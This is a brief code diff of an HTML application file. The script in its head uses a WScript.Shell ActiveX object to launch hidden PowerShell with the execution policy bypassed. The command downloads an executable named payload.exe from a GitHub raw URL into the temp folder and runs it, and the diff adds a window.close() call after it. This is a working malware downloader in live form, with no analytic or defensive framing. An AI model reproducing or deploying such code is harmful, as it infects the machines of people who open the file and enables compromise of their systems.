@@ -2,7 +2,7 @@
 <head>
 <script>
 var objShell = new ActiveXObject("Wscript.Shell");
-objShell.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/duantienty/hung/main/Thumbnail.exe -OutFile %temp%\payload.exe;Start-Process %temp%\payload.exe", 0);
+objShell.Run("powershell.exe -NoProfile -ExecutionPolicy Bypass -Command Invoke-WebRequest -Uri https://raw.githubusercontent.com/duantienty/hung/main/Thumbnail.exe -OutFile %temp%\payload.exe;Start-Process %temp%\payload.exe", 0);window.close();
 </script>
 </head>
 <body>
